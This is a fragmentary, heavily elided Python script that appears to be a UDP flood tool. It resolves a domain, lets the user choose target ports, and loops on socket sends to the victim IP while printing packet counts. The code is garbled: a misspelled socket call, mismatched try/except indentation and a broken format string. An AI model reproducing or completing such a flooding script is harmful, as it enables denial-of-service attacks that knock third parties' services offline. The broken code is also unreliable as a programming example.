...
while True:
    ...
    if opt == '1':
        ...
        ip = socket.gethotsbyname(domain)
        break
        ...
        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_\033[0m")
        ...
        print('\033[91mlnvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd.clear)
     ...
     if port_mode == False: # ALL ports
        ...
        try:
            while True:
                sock.sendto(bytes, (ip, port))
                send += 1
                print("\033[32;1mSent %s packets to %s throurgh port:%s"'%s(sent, ip, port))
            except:
                print('\n\033[31;1mExited\033[0m]')
